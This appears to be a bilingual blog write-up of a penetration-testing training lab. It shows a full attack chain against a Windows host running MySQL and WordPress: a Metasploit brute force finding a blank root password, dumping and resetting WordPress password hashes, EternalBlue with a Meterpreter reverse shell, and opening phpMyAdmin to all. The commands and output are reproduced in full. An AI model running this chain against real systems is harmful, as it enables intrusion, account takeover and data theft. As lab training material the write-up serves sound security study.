---
layout: post
title: "Targeting MySQL Database Server"
date: "2023-05-06"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Exploitation
---

# Windows Black Box Penetration Test（Windows 黑盒渗透测试）
## Targeting MySQL Database Server（针对 MySQL 数据库服务器）
# Demo: Targeting MySQL Database Server（演示：针对 MySQL 数据库服务器）
We'll be taking a look at how to gain access to the MySQL database server that is running on the target system. In addition to that, we'll be taking a look at how access to a MySQL database server can provide you with access to the web applications that are currently utilizing the MySQL database server for storage. And this is arguably one of the most important services to exploit when it comes down to a penetration test because any database server is going to be storing information. And in the case of a company that has customer data, if any of that data is being stored on a database server and you gain access to it, then that is something that needs to be taken seriously in the context of the company's organizational security as well as their digital infrastructure. We'll primarily be utilizing one technique. But once we've gained access to the MySQL database server, you'll see how this access can be used to gain access to web applications and how you can modify data, so on and so forth.

I've just performed a service version detection scan and a default Nmap script scan on the following port.

3306, that's the default MySQL port. as well as port 8585, where we were able to identify that we have WampServer that is hosting a WordPress site as well as phpMyAdmin. However, we couldn't access phpMyAdmin because access had been restricted to a specific IP, probably the localhost.

```
nmap -sV -sC -p 3306,8585 10.0.25.212
```

The most important thing to know is that MySQL supports authentication and can be remotely authenticated to if you have the legitimate credentials.

We can also look for exploits pertinent to this specific version of MySQL.

And I can try and identify any exploits that can provide us with access to a specific set of user accounts and their passwords.

```
searchsploit MySQL 5.5
```

The next best thing is to perform a brute force.

```
msfconsole
search mysql_login
use 0
show options
```

A default username has been specified. And this is the root user, which is pretty much the user account that you should probably be targeting for because if you obatin the root account credentials for a MySQL database server, then that means that you can make whatever changes you want to to any of the databases and their consequent or respective tables without any issues.

```
set RHOSTS 10.0.25.212
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
run
exit
```

The administrator did not set a password for the root user of the MySQL database. And that means that we can log in without providing any password.

And we can log into the MySQL database server using the following command:

```
mysql -u root -p -h 10.0.25.212
```

We have gained access to the MySQL database server. So that means that we have root access and that we can start modifying data that's stored within the MySQL database server.

```
MySQL [(none)]> show databases;
MySQL [(none)]> exit
```

```
http://10.0.25.212:8585
```

It is hosting a WordPress installation as well as phpMyAdmin.

We can gain access to the WordPress site via the admin credentials because we have access to the MySQL database.

And in that case, we will need to knew a lot of MySQL syntax.

We can also try and gain access to phpMyAdmin.

```
http://10.0.25.212:8585/phpmyadmin/
```

It's forbidden.

In the previous video, we took a look at how we can gain access to the target system via SMB. And why don't we do that so that we can modify the phpMyAdmin configuration file, consequently allowing any user to access phpMyAdmin via browser?

We can use PsExec or we can utilize EternalBlue.

```
msfconsole
search eternalblue
use 0
show options
set RHOSTS 10.0.25.212
exploit
```

And we should get an elevated Meterpreter session on the target system that will allow us to download the phpMyAdmin config file, modify it, and then upload the new modified version.

We get an Meterpreter session.

```
meterpreter > sysinfo
meterpreter > getuid
Server username: AUTHORITY\SYSTEM
```

In certain cases, in order to modify files that belong to applications like WAMP, you will need elevated privileges in order to do that. And in this case, we do. So we can take advantage of that.

The WAMP stack for Windows typically stores the web applications that are being hosted on it as well as the configuration files for them within the C drive in a folder called "wamp".

```
meterpreter > cd /
meterpreter > ls
meterpreter > pwd
meterpreter > cd wamp\\
meterpreter > ls
```

Under apps, that's typically where you'll find your web applications. Alternatively, they could be under www.

```
meterpreter > cd www\\
meterpreter > ls
```

We could have obtained the MySQL credentials by taking a look at the wordpress config file. That file typically contains the MySQL database passwords. 

```
meterpreter > cd wordpress\\
meterpreter > cat wp-config.php
```

```
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', '');
```

That's where the apps are stored.

If we want to change the WordPress admin password, you need to do that through MySQL. But that will require knowledge of MySQL queries.

So we leverage phpMyAdmin, because phpMyAdmin is much easier to use in regards to modifying data that's stored within a table.

```
meterpreter > cd ..
meterpreter > ls
meterpreter > cd ..
meterpreter > ls
```

I'm looking for the phpMyAdmin config file. That is probably stored under alias.

```
meterpreter > cd alias\\
meterpreter > ls
```

We have phpmyadmin.conf. This configuration file is used to control access and the way phpMyAdmin works. This file has been modified to prevent anyone from accessing it, apart from the user on the localhost.

We can download this file locally.

```
meterpreter > download phpmyadmin.conf
```

```
ls
vim phpmyadmin.conf
```

This is where those rules have been set. The default order is set to deny and allow. And it denies access from all IP addresses and allows access only from the localhost or the target system itself.

We can get rid of all of these rules.

Instead of allowing access only from the localhost: 

```
Allow from all
```

We need to upload the updated version.

```
meterpreter > upload phpmyadmin.conf
meterpreter > ls
```

And the great thing with Meterpreter is it will automatically replace the file with the one that you've just uploaded. So that contains the changes.

We can confirm that by:

```
meterpreter > cat phpmyadmin.conf
```

Those rules have now been updated.

If we try and reload phpMyAdmin here, it's still forbidden.

```
http://10.0.25.212:8585/phpmyadmin/
```

The reason for that is because once you make any change to the Apache configuration file for any of these applications or to the default Apache configuration file, you need to restart the Apache service.

In order to restart the service, we need to open up a Windows command prompt session here.

```
meterpreter > shell
```

We need to stop the WAMP Apache service.

This requires administrative privileges.

```
C:\wamp\alias>net stop wampapache
```

That'll stop the service.

```
C:\wamp\alias>net start wampapache
```

If it starts successfully without any errors, then we should be able to access phpMyAdmin.

```
http://10.0.25.212:8585/phpmyadmin/
```

In fact, we are automatically logged into phpMyAdmin.

What we were trying to do is showcase how access to the MySQL database server can be used to gain access to the web applications that are being hosted on the target system.

wordpress->wp_users

We want to gain access to the admin account. So we need to change the default password or the password that existed previously.

In a real pen test, you definitely do not want to do this. Your job is to just show and document the fact that you were able to do this. And you need to highlight how you did it.

Edit->user_pass->Function MD5->Value password123

And the great thing with phpMyAdmin and MySQL is it will automatically encrypt it with MD5.

Go back to WampServer home page. And we can try and log into WordPress.

```
http://10.0.25.212:8585/
```

wordpress

```
http://10.0.25.212:8585/wordpress/wp-admin
```

That'll allow me to log into the admin dashboard.

And that should provide us access to the WordPress dashboard, which consequently gives us access to the entire Wordpress site. And we can make changes and furthermore download and view customer data or whatever data is being stored within the WordPress site itself.

```
admin
password123
```

We now have access to the WordPress site. And we can pretty much modify, do whatever we want with it.

It involved chaining or utilizing access from one service to gain access to another service, or in this case a web application.

That is how to target and exploit the MySQL database server.

In this case, this system was set up to showcase the techniques as opposed to it being hardened and secured. But if it was still protected with a weak password, we would have been able to perform a brute force attack and identify that password irregardless of that. 

# Targeting MySQL Database Server（针对 MySQL 数据库服务器）
## Overview（概述）
Goal

The objective of this lab is to outline the various techniques that can be used to exploit a MySQL database server running on a Windows target.

目标

本实验的目的是概述可用于利用在 Windows 目标上运行的 MySQL 数据库服务器的各种技术。

## Tasks（任务）
Pre-requisites

1. Basic familiarity with Nmap.
2. Basic familiarity with the Metasploit Framework.

Requirements

This task does not have any requirements.

先决条件

1. 基本熟悉 Nmap。
2. 基本熟悉 Metasploit 框架。

要求

此任务没有任何要求。

## 复现视频内容

```
root@attackdefense:~# cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.6        attackdefense.com attackdefense
127.0.0.1 AttackDefense-Kali
10.10.16.2      attackdefense.com attackdefense
10.0.29.76    demo.ine.local
```

10.0.29.76    demo.ine.local

Kali Linux: 10.10.16.2

```
root@attackdefense:~# nmap -sV -sC -p 3306,8585 10.0.29.76 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-06 18:33 IST
Nmap scan report for demo.ine.local (10.0.29.76)
Host is up (0.0028s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.20-log
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.20-log
|   Thread ID: 6
|   Capabilities flags: 63487
|   Some Capabilities: FoundRows, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, InteractiveClient, IgnoreSigpipes, SupportsTransactions, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, LongColumnFlag, LongPassword, Support41Auth, SupportsCompression, ConnectWithDatabase, SupportsLoadDataLocal, ODBCClient, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: /jKv38`]/qlKprlG\{uY
|_  Auth Plugin Name: mysql_native_password
8585/tcp open  http    Apache httpd 2.2.21 ((Win64) PHP/5.3.10 DAV/2)
|_http-server-header: Apache/2.2.21 (Win64) PHP/5.3.10 DAV/2
|_http-title: WAMPSERVER Homepage

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.80 seconds
```

```
root@attackdefense:~# searchsploit MySQL 5.5
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
MySQL / MariaDB / PerconaDB 5.5.51/5.6.32/5.7.14 - Code Execution / Privilege Escalation                                                                  | linux/local/40360.py
MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'mysql' System User Privilege Escalation / Race Condition                                                 | linux/local/40678.c
MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'root' System User Privilege Escalation                                                                   | linux/local/40679.sh
MySQL 5.1/5.5 (Windows) - 'MySQLJackpot' Remote Command Execution                                                                                         | windows/remote/23073.txt
MySQL 5.5.45 (x64) - Local Credentials Disclosure                                                                                                         | windows_x86-64/local/40337.py
MySQL 5.5.45 - procedure analyse Function Denial of Service                                                                                               | multiple/dos/39867.py
MySQL 5.5.8 - Remote Denial of Service                                                                                                                    | windows/dos/18269.py
MySQL < 5.6.35 / < 5.7.17 - Integer Overflow                                                                                                              | multiple/dos/41954.py
MySQL Eventum 1.5.5 - 'login.php' SQL Injection                                                                                                           | php/webapps/1134.pl
MySQL Quick Admin 1.5.5 - 'cookie' Local File Inclusion                                                                                                   | php/webapps/6641.txt
MySQL Quick Admin 1.5.5 - Local File Inclusion                                                                                                            | php/webapps/7020.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

```
msf6 > search mysql_login

Matching Modules
================

   #  Name                                 Disclosure Date  Rank    Check  Description
   -  ----                                 ---------------  ----    -----  -----------
   0  auxiliary/scanner/mysql/mysql_login                   normal  No     MySQL Login Utility


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/mysql/mysql_login

msf6 > use 0
msf6 auxiliary(scanner/mysql/mysql_login) > show options

Module options (auxiliary/scanner/mysql/mysql_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   true             no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT             3306             yes       The target port (TCP)
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME          root             no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts

msf6 auxiliary(scanner/mysql/mysql_login) > setg RHOSTS 10.0.29.76
RHOSTS => 10.0.29.76
msf6 auxiliary(scanner/mysql/mysql_login) > set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
PASS_FILE => /usr/share/wordlists/metasploit/unix_passwords.txt
msf6 auxiliary(scanner/mysql/mysql_login) > run

[+] 10.0.29.76:3306       - 10.0.29.76:3306 - Found remote MySQL version 5.5.20
[!] 10.0.29.76:3306       - No active DB -- Credential data will not be saved!
[+] 10.0.29.76:3306       - 10.0.29.76:3306 - Success: 'root:'
[*] 10.0.29.76:3306       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
[+] 10.0.29.76:3306       - 10.0.29.76:3306 - Found remote MySQL version 5.5.20
[!] 10.0.29.76:3306       - No active DB -- Credential data will not be saved!
[+] 10.0.29.76:3306       - 10.0.29.76:3306 - Success: 'root:'
```

```
root@attackdefense:~# mysql -u root -p '' -h 10.0.29.76
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 16
Server version: 5.5.20-log MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL []> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| cards              |
| mysql              |
| performance_schema |
| test               |
| wordpress          |
+--------------------+
6 rows in set (0.003 sec)

MySQL []> exit
Bye
```

Or

```
MySQL [(none)]> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [wordpress]> show tables;
+---------------------------+
| Tables_in_wordpress       |
+---------------------------+
| wp_commentmeta            |
| wp_comments               |
| wp_links                  |
| wp_nf_objectmeta          |
| wp_nf_objects             |
| wp_nf_relationships       |
| wp_ninja_forms_fav_fields |
| wp_ninja_forms_fields     |
| wp_options                |
| wp_postmeta               |
| wp_posts                  |
| wp_term_relationships     |
| wp_term_taxonomy          |
| wp_termmeta               |
| wp_terms                  |
| wp_usermeta               |
| wp_users                  |
+---------------------------+
17 rows in set (0.004 sec)

MySQL [wordpress]> select * from wp_users;
+----+------------+------------------------------------+---------------+---------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email          | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+---------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$B2PFjjNJHOQwDzqrQxfX4GYzasKQoN0 | admin         | admin@example.com   |          | 2016-09-26 22:28:12 |                     |           0 | admin        |
|  2 | vagrant    | $P$BMO//62Hj1IFeIr0XuJUqMmtBllnzN/ | vagrant       | vagrant@example.com |          | 2016-09-27 20:13:37 |                     |           0 | vagrant      |
|  3 | user       | $P$B83ijKvzkiB6yZL8Ubpi35CMQHiQjv/ | user          | user@example.com    |          | 2016-09-27 20:14:08 |                     |           0 | user         |
|  4 | manager    | $P$BvcrF0Y02JqJRkbXMREj/CBvP..21s1 | manager       | manager@example.com |          | 2016-09-27 20:15:14 |                     |           0 | manager      |
+----+------------+------------------------------------+---------------+---------------------+----------+---------------------+---------------------+-------------+--------------+
4 rows in set (0.004 sec)

MySQL [wordpress]> UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';
Query OK, 1 row affected (0.009 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MySQL [wordpress]> select * from wp_users;
+----+------------+------------------------------------+---------------+---------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email          | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+---------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | 482c811da5d5b4bc6d497ffa98491e38   | admin         | admin@example.com   |          | 2016-09-26 22:28:12 |                     |           0 | admin        |
|  2 | vagrant    | $P$BMO//62Hj1IFeIr0XuJUqMmtBllnzN/ | vagrant       | vagrant@example.com |          | 2016-09-27 20:13:37 |                     |           0 | vagrant      |
|  3 | user       | $P$B83ijKvzkiB6yZL8Ubpi35CMQHiQjv/ | user          | user@example.com    |          | 2016-09-27 20:14:08 |                     |           0 | user         |
|  4 | manager    | $P$BvcrF0Y02JqJRkbXMREj/CBvP..21s1 | manager       | manager@example.com |          | 2016-09-27 20:15:14 |                     |           0 | manager      |
+----+------------+------------------------------------+---------------+---------------------+----------+---------------------+---------------------+-------------+--------------+
4 rows in set (0.003 sec)
```

![QQ图片20230506212100.png](/img/in-post/ine/QQ图片20230506212100.png)

```
http://10.0.29.76:8585/phpmyadmin/
```

![QQ图片20230506212338.png](/img/in-post/ine/QQ图片20230506212338.png)

```
msf6 auxiliary(scanner/mysql/mysql_login) > search eternalblue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 auxiliary(scanner/mysql/mysql_login) > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.0.29.76       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target m
                                             achines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machi
                                             nes.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.10.16.2:4444 
[*] 10.0.29.76:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.0.29.76:445        - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)
[*] 10.0.29.76:445        - Scanned 1 of 1 hosts (100% complete)
[+] 10.0.29.76:445 - The target is vulnerable.
[*] 10.0.29.76:445 - Connecting to target for exploitation.
[+] 10.0.29.76:445 - Connection established for exploitation.
[+] 10.0.29.76:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.0.29.76:445 - CORE raw buffer dump (51 bytes)
[*] 10.0.29.76:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 10.0.29.76:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard 
[*] 10.0.29.76:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
[*] 10.0.29.76:445 - 0x00000030  6b 20 31                                         k 1             
[+] 10.0.29.76:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.0.29.76:445 - Trying exploit with 12 Groom Allocations.
[*] 10.0.29.76:445 - Sending all but last fragment of exploit packet
[*] 10.0.29.76:445 - Starting non-paged pool grooming
[+] 10.0.29.76:445 - Sending SMBv2 buffers
[+] 10.0.29.76:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.0.29.76:445 - Sending final SMBv2 buffers.
[*] 10.0.29.76:445 - Sending last fragment of exploit packet!
[*] 10.0.29.76:445 - Receiving response from exploit packet
[+] 10.0.29.76:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.0.29.76:445 - Sending egg to corrupted connection.
[*] 10.0.29.76:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 10.0.29.76
[+] 10.0.29.76:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.0.29.76:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.0.29.76:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 1 opened (10.10.16.2:4444 -> 10.0.29.76:49386 ) at 2023-05-06 18:59:48 +0530

meterpreter > sysinfo
Computer        : VAGRANT-2008R2
OS              : Windows 2008 R2 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

```
meterpreter > cd /
meterpreter > pwd
C:\
meterpreter > ls
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2009-07-14 08:04:39 +0530  $Recycle.Bin
100444/r--r--r--  8192    fil   2021-10-28 21:41:09 +0530  BOOTSECT.BAK
040777/rwxrwxrwx  4096    dir   2021-10-28 21:41:09 +0530  Boot
040777/rwxrwxrwx  0       dir   2009-07-14 10:36:44 +0530  Documents and Settings
040777/rwxrwxrwx  0       dir   2009-07-14 08:50:08 +0530  PerfLogs
040555/r-xr-xr-x  4096    dir   2021-11-02 00:14:05 +0530  Program Files
040555/r-xr-xr-x  4096    dir   2021-10-28 19:54:25 +0530  Program Files (x86)
040777/rwxrwxrwx  4096    dir   2021-11-02 00:20:44 +0530  ProgramData
040777/rwxrwxrwx  0       dir   2021-10-28 20:42:46 +0530  Recovery
040777/rwxrwxrwx  4096    dir   2021-10-28 20:01:16 +0530  RubyDevKit
040777/rwxrwxrwx  4096    dir   2021-10-28 20:41:52 +0530  System Volume Information
040555/r-xr-xr-x  4096    dir   2021-10-28 19:52:30 +0530  Users
040777/rwxrwxrwx  16384   dir   2021-11-02 00:21:12 +0530  Windows
100444/r--r--r--  383786  fil   2010-11-21 08:54:02 +0530  bootmgr
040777/rwxrwxrwx  0       dir   2021-10-28 19:58:42 +0530  glassfish
040777/rwxrwxrwx  0       dir   2021-10-28 19:52:09 +0530  inetpub
100666/rw-rw-rw-  0       fil   2021-10-28 20:08:20 +0530  jack_of_diamonds.png
040777/rwxrwxrwx  0       dir   2021-10-28 20:00:42 +0530  openjdk6
000000/---------  0       fif   1970-01-01 05:30:00 +0530  pagefile.sys
040777/rwxrwxrwx  0       dir   2021-10-28 20:08:24 +0530  startup
040777/rwxrwxrwx  0       dir   2021-10-28 20:00:57 +0530  tools
040777/rwxrwxrwx  4096    dir   2021-10-28 20:00:10 +0530  wamp

meterpreter > cd w
cd Windows\\  cd wamp\\     
meterpreter > cd wamp\\
meterpreter > ls
Listing: C:\wamp
================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
040777/rwxrwxrwx  4096     dir   2021-10-28 20:07:14 +0530  alias
040777/rwxrwxrwx  0        dir   2021-10-28 20:00:05 +0530  apps
100666/rw-rw-rw-  4790     fil   2010-12-31 21:09:42 +0530  barimage.bmp
040777/rwxrwxrwx  0        dir   2021-10-28 20:00:08 +0530  bin
100666/rw-rw-rw-  16054    fil   2011-01-04 01:19:34 +0530  images_off.bmp
100666/rw-rw-rw-  16054    fil   2011-01-04 01:19:34 +0530  images_on.bmp
040777/rwxrwxrwx  8192     dir   2021-10-28 20:00:09 +0530  lang
100666/rw-rw-rw-  15668    fil   2010-12-31 22:56:16 +0530  license.txt
040777/rwxrwxrwx  0        dir   2021-10-28 20:00:11 +0530  logs
040777/rwxrwxrwx  4096     dir   2021-10-28 20:00:09 +0530  scripts
040777/rwxrwxrwx  0        dir   2021-10-28 20:00:09 +0530  tmp
040777/rwxrwxrwx  0        dir   2021-10-28 20:00:09 +0530  tools
100666/rw-rw-rw-  182407   fil   2021-10-28 20:00:09 +0530  unins000.dat
100777/rwxrwxrwx  913246   fil   2021-10-28 20:00:04 +0530  unins000.exe
100777/rwxrwxrwx  209      fil   2021-10-28 20:00:09 +0530  uninstall_services.bat
100666/rw-rw-rw-  994      fil   2021-10-28 20:00:09 +0530  wampmanager.conf
100777/rwxrwxrwx  1169920  fil   2010-12-31 21:10:06 +0530  wampmanager.exe
100666/rw-rw-rw-  1147     fil   2021-10-28 20:00:09 +0530  wampmanager.ini
100666/rw-rw-rw-  12681    fil   2021-10-28 20:00:09 +0530  wampmanager.tpl
040777/rwxrwxrwx  4096     dir   2021-10-28 20:07:30 +0530  www
```

```
meterpreter > cd www\\
meterpreter > ls
Listing: C:\wamp\www
====================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100666/rw-rw-rw-  22409  fil   2021-10-28 20:00:09 +0530  index.php
100666/rw-rw-rw-  1189   fil   2021-10-28 19:49:02 +0530  meterpreter.php
100666/rw-rw-rw-  491    fil   2021-10-28 19:49:02 +0530  mma.php
100666/rw-rw-rw-  190    fil   2010-12-31 21:10:06 +0530  testmysql.php
040777/rwxrwxrwx  0      dir   2021-10-28 20:07:14 +0530  uploads
040777/rwxrwxrwx  4096   dir   2016-09-27 03:58:12 +0530  wordpress

meterpreter > cd wordpress\\
meterpreter > ls
Listing: C:\wamp\www\wordpress
==============================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100666/rw-rw-rw-  255    fil   2016-09-27 03:58:12 +0530  .htaccess
100666/rw-rw-rw-  418    fil   2013-09-25 05:48:11 +0530  index.php
100666/rw-rw-rw-  19935  fil   2016-03-06 01:44:25 +0530  license.txt
100666/rw-rw-rw-  7344   fil   2016-08-17 02:09:31 +0530  readme.html
100666/rw-rw-rw-  5456   fil   2016-05-25 02:32:28 +0530  wp-activate.php
040777/rwxrwxrwx  32768  dir   2016-09-07 20:28:58 +0530  wp-admin
100666/rw-rw-rw-  364    fil   2015-12-19 16:50:28 +0530  wp-blog-header.php
100666/rw-rw-rw-  1477   fil   2016-05-23 22:14:27 +0530  wp-comments-post.php
100666/rw-rw-rw-  2853   fil   2015-12-16 15:28:26 +0530  wp-config-sample.php
100666/rw-rw-rw-  3118   fil   2016-09-27 03:57:50 +0530  wp-config.php
040777/rwxrwxrwx  0      dir   2016-09-28 02:07:14 +0530  wp-content
100666/rw-rw-rw-  3286   fil   2015-05-24 22:56:25 +0530  wp-cron.php
040777/rwxrwxrwx  65536  dir   2016-09-07 20:28:59 +0530  wp-includes
100666/rw-rw-rw-  2382   fil   2016-05-23 22:14:27 +0530  wp-links-opml.php
100666/rw-rw-rw-  3353   fil   2016-04-14 23:23:28 +0530  wp-load.php
100666/rw-rw-rw-  34057  fil   2016-06-15 03:21:28 +0530  wp-login.php
100666/rw-rw-rw-  7786   fil   2016-07-13 18:07:29 +0530  wp-mail.php
100666/rw-rw-rw-  13920  fil   2016-08-13 21:32:31 +0530  wp-settings.php
100666/rw-rw-rw-  29890  fil   2016-05-25 02:14:29 +0530  wp-signup.php
100666/rw-rw-rw-  4035   fil   2014-12-01 02:53:23 +0530  wp-trackback.php
100666/rw-rw-rw-  3064   fil   2016-07-06 18:10:29 +0530  xmlrpc.php
```

```
meterpreter > cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', '');
```

```
meterpreter > pwd
C:\wamp\www\wordpress
meterpreter > cd ../..
meterpreter > pwd
C:\wamp
meterpreter > ls
Listing: C:\wamp
================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
040777/rwxrwxrwx  4096     dir   2021-10-28 20:07:14 +0530  alias
040777/rwxrwxrwx  0        dir   2021-10-28 20:00:05 +0530  apps
100666/rw-rw-rw-  4790     fil   2010-12-31 21:09:42 +0530  barimage.bmp
040777/rwxrwxrwx  0        dir   2021-10-28 20:00:08 +0530  bin
100666/rw-rw-rw-  16054    fil   2011-01-04 01:19:34 +0530  images_off.bmp
100666/rw-rw-rw-  16054    fil   2011-01-04 01:19:34 +0530  images_on.bmp
040777/rwxrwxrwx  8192     dir   2021-10-28 20:00:09 +0530  lang
100666/rw-rw-rw-  15668    fil   2010-12-31 22:56:16 +0530  license.txt
040777/rwxrwxrwx  0        dir   2021-10-28 20:00:11 +0530  logs
040777/rwxrwxrwx  4096     dir   2021-10-28 20:00:09 +0530  scripts
040777/rwxrwxrwx  0        dir   2021-10-28 20:00:09 +0530  tmp
040777/rwxrwxrwx  0        dir   2021-10-28 20:00:09 +0530  tools
